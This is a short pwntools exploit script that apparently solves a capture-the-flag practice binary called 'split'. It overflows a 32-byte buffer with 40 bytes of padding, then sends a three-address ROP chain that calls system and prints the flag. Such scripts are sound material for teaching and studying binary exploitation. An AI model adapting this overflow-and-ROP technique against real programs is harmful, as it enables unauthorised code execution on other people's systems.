from pwn import *

p = process('./split')

p.recvuntil(b">")

payload = b"A" * 40 # 32 (buf len) + 8 (rbp)

payload += p64(0x4007c3)
payload += p64(0x601060)
payload += p64(0x40074b)

p.sendline(payload)

data = p.recvall().decode().strip()
flag = data.split("\n")[1]
print(flag)